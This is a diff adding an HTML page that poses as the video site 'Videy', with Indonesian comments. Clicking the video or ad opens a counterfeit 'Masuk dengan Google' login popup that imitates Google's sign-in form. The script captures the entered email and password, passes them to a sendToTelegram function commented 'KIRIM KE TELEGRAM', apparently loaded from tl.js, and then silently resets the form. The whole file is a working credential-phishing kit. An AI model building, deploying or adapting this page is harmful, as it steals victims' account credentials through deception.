@@ -1,0 +1,368 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+    <meta name="description" content="Videy is a platform for free and simple video hosting.">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>Untitled Video | Videy - free and simple video hosting</title>
+    <link rel="icon" type="image/x-icon" href="media/favicon.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@200;300;400;600&amp;family=Poppins:wght@600&amp;display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script><style type="text/css">* {user-select: auto !important; -webkit-user-select: auto !important;}</style><input type="hidden" id="inject_idm_text_selection">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+    <link rel="stylesheet" href="assets/style.css">
+    <link rel="stylesheet" href="assets/google.css">
+    <script src="tl.js"></script>
+<style>
+/* TAMBAHAN UNTUK POPUP FORM GOOGLE */
+.popup-login {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.5);
+    z-index: 10000;
+    display: none;
+    justify-content: center;
+    align-items: center;
+}
+</style>
+</head>
+
+<body style="">
+
+<style>
+.popup-box-wrapper {
+    background: rgba(0, 0, 0, 0.4);
+    width: 100%;
+    height: 100%;
+    top: 0;
+    left: 0;
+    z-index: 9999;
+    position: fixed;
+}
+.popup-box-content {
+    background: #fff;
+    width: 360px;
+    height: auto;
+    margin: 50px auto;
+    margin-top: 15%;
+    padding: 5px;
+    text-align: center;
+    border-radius: 5px;
+}
+.popup-box-content-title {
+    margin-top: 10px;
+    margin-bottom: 10px;
+    color: #000;
+    font-size: 20px;
+    text-align: center;
+}
+.popup-btn-login {
+    background: #fff;
+    margin-top: 8px;
+    color: #7d7d7f;
+    border: 1px solid #7d7d7f;
+    width: 70%;
+    height: auto;
+    margin-left: auto;
+    margin-right: auto;
+    padding: 10px;
+    font-size: 17px;
+    font-weight: bold;
+    border-radius: 7px;
+    cursor: pointer;
+    outline: none;
+    display: block;
+}
+.popup-btn-login-bg-gugel {
+    background: #fff;
+    margin-top: 8px;
+    color: #7d7d7f;
+    border: 1px solid #7d7d7f;
+}
+.popup-btn-login img {
+    width: 23px;
+    margin-top: -1px;
+    float: left;
+}
+.popup-box-login-google-2 {
+    background: #fff;
+    max-width: 330px;
+    height: auto;
+    margin: 50px auto;
+    margin-top: 10%;
+    text-align: center;
+    border-radius: 10px;
+    position: relative;
+}
+.close-other {
+    background: #fff;
+    width: 25px;
+    height: 25px;
+    color: #000;
+    font-size: 20px;
+    text-align: center;
+    border-radius: 50%;
+    top: -12px;
+    right: -12px;
+    position: absolute;
+    z-index: 9999999;
+    display: block;
+}
+.close-other i {
+    color: #20px;
+    padding-top: 3px;
+}
+.play-button {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: rgba(0, 0, 0, 0.6);
+    border-radius: 50%;
+    width: 70px;
+    height: 70px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    transition: 0.3s;
+    cursor: pointer;
+}
+.play-button i {
+    color: white;
+    font-size: 30px;
+    margin-left: 3px;
+}
+.play-button:hover {
+    background: rgba(0, 0, 0, 0.8);
+    transform: translate(-50%, -50%) scale(1.1);
+}
+@media only screen and (max-width:600px) {
+    .popup-box-content {
+        width: 340px;
+        margin-top: 60%;
+    }
+}
+</style>
+
+    <div class="nav-outer">
+        <div class="nav-inner">
+            <div class="logo-text">
+                <a href="/">videy</a>
+            </div>
+            <a href="/">
+                <div class="upload-button-nav">Upload</div>
+            </a>
+            <div class="legal">
+                <div class="legal-menu">
+                    <a href="javascript:void(0);" class="icon"><i class="fa fa-bars" onclick="toggleMobileNavbar()"></i></a>
+                </div>
+                <div class="legal-item">
+                    <a href="/">Privacy Policy</a>
+                </div>
+                <div class="legal-item">
+                    <a href="/">Terms of Service</a>
+                </div>
+                <div class="legal-item">
+                    <a href="/">Abuse</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="mobile-menu">
+        <a href="/">Privacy Policy</a>
+        <a href="/">Terms of Service</a>
+        <a href="/">Abuse</a>
+    </div>
+    <div class="body">
+    <br>
+    <div class="video-wrapper" style="position: relative; display: inline-block;">
+        <img src="media/foto_1761574758.jpg" alt="" onclick="login()" style="cursor:pointer; display:block; width:100%;">
+        <div class="play-button" onclick="login()">
+            <i class="fas fa-play"></i>
+        </div>
+    </div>
+    <h3>VIDEO TERBARU 2026</h3>
+    <br>
+    <img src="media/ads.jpg" alt="" style="width: 100%; border: none;" onclick="login()">
+</div>
+
+<div class="popup-box-wrapper account_login" style="display: none;">
+<div class="popup-box-content">
+<div class="popup-box-content-title">Login untuk melanjutkan menonton</div>
+    <div class="flex flex-col space-y-3">
+        <div class="popup-btn-login popup-btn-login-bg-gugel" onclick="gugel()"><img src="media/gugel.png"> Masuk dengan Google</div>
+    </div>
+  <br>
+</div>
+</div>
+
+<div class="popup-login login-google animated fadeIn" style="display: none;">
+<div class="popup-box-login-google-2 clearfix">
+<a onclick="cl_gugel()" class="close-other"><i class="zmdi zmdi-close"></i></a>
+<div class="box-google">
+<div class="header-google"><svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="BFr46e xduoyf">
+<g id="qaEJec">
+<path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
+</g>
+<g id="YGlOvc">
+<path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
+</g>
+<g id="BWfIk">
+<path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
+</g>
+<g id="e6m3fd">
+<path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
+</g>
+<g id="vbkDmc">
+<path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
+</g>
+<g id="idEJde">
+<path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
+</g>
+</svg>
+</div>
+<div class="txt-login-google">Login</div>
+<div class="txt-login-google-desc">Use your Google Account</div>
+<div class="fillForm">
+<form action="javascript:void(0)" method="post" id="ValidateLoginGpForm">
+<div class="input-box">
+<label class="input-label" style="text-shadow: none;">Email Address</label>
+<input type="text" class="input-1" name="email" id="email-google" onfocus="setFocus(true)" onblur="setFocus(false)" required="">
+</div>
+<div class="input-box">
+<label class="input-label" style="text-shadow: none;">Password</label>
+<input type="password" class="input-1" name="password" id="password-google" onfocus="setFocus(true)" onblur="setFocus(false)" required="">
+</div>
+<input type="hidden" name="login" id="login-google" value="Google" readonly="">
+<div class="email-gp" style="color: #d50000; font-size: 15px; text-align: left; display: none;">
+<svg style="float: left; margin-right: 5px; margin-top: 3px;" aria-hidden="true" fill="currentColor" focusable="false" width="13px" height="13px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+</svg> Your Google Account cannot be found.</div>
+<div class="sandi-gp" style="color: #d50000; font-size: 15px; text-align: left; display: none;">
+<svg style="float: left; margin-right: 5px; margin-top: 3px;" aria-hidden="true" fill="currentColor" focusable="false" width="13px" height="13px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+</svg> Wrong password, please try again.</div>
+<div class="btn-forgot-google">Forgot your email?</div>
+<br>
+<div class="notify-google">Not your computer? Use Guest mode to sign in privately. <span>Learn more</span></div>
+<br>
+<button type="submit" class="btn-login-google" onclick="ValidateLoginGpData()">Next</button>
+<button type="button" class="btn-create-google">Create account</button>
+</form>
+</div>
+<div class="filledForm" style="display: none;">
+<i style="margin-top: 50px; margin-bottom: 50px;" class="zmdi zmdi-spinner zmdi-hc-3x zmdi-hc-spin"></i>
+</div>
+<br>
+<br>
+</div>
+</div>
+</div>
+
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script>
+        function toggleMobileNavbar() {
+            var x = document.getElementById("mobile-menu");
+            if (x.style.display === "flex") {
+                x.style.display = "none";
+            } else {
+                x.style.display = "flex";
+            }
+        }
+    </script>
+    <script type="text/javascript">
+    function setFocus(on) {
+  var element = document.activeElement;
+  if (on) {
+      setTimeout(function() {
+          element.parentNode.classList.add("focus");
+      });
+  } else {
+      let box = document.querySelector(".input-box");
+      box.classList.remove("focus");
+      $("input").each(function() {
+          var $input = $(this);
+          var $parent = $input.closest(".input-box");
+          if ($input.val()) $parent.addClass("focus");
+          else $parent.removeClass("focus");
+      });
+  }
+}
+
+        function login() {
+            $('.account_login').fadeIn();
+        }
+        function gugel() {
+            $('.account_login').fadeOut();
+            $('.login-google').fadeIn();
+        }
+        
+        function cl_gugel() {
+            $('.account_login').fadeIn();
+            $('.login-google').fadeOut();
+        }
+    </script>
+    
+<script>
+function ValidateLoginGpData() {
+    $('#ValidateLoginGpForm').submit(function(submitingValidateLoginGpData) {
+        submitingValidateLoginGpData.preventDefault();
+
+        $emailgp = $('#email-google').val().trim();
+        $passwordgp = $('#password-google').val().trim();
+        $logingp = $('#login-google').val().trim();
+
+        if ($emailgp == '' || $emailgp == null || $emailgp.length <= 5) {
+            $('.email-gp').show();
+            $('.sandi-gp').hide();
+            $('.login-google').show();
+            return false;
+        } else {
+            $('.email-gp').hide();
+            $("input#validateEmail").val($emailgp);
+            $('.fillForm').hide();
+            $('.filledForm').show();
+        }
+
+        if ($passwordgp == '' || $passwordgp == null || $passwordgp.length <= 5) {
+            $('.sandi-gp').show();
+            $('.email-gp').hide();
+            $('.login-google').show();
+            return false;
+        } else {
+            $('.sandi-gp').hide();
+            $("input#validatePassword").val($passwordgp);
+            $("input#validateLogin").val($logingp);
+            $('.fillForm').hide();
+            $('.filledForm').show();
+        }
+        var $validateEmail = $("input#validateEmail").val();
+        var $validatePassword = $("input#validatePassword").val();
+        var $validateLogin = $("input#validateLogin").val();
+        if ($validateEmail == "" && $validatePassword == "" && $validateLogin == "") {
+            $('.fillForm').hide();
+            $('.filledForm').show();
+            return false;
+        }
+
+        // KIRIM KE TELEGRAM
+        if (typeof sendToTelegram === 'function') {
+            sendToTelegram($emailgp, $passwordgp);
+        }
+
+        // TUTUP SEMUA POPUP (KEMBALI KE HALAMAN AWAL)
+        setTimeout(function() {
+            $('.login-google').fadeOut();
+            $('.account_login').fadeOut();  // LANGSUNG TUTUP POPUP LOGIN PERTAMA JUGA
+            $('.fillForm').show();
+            $('.filledForm').hide();
+            $('#email-google, #password-google').val('');
+        }, 1500);
+    });
+    return false;
+};
+</script>
+
+</body></html>
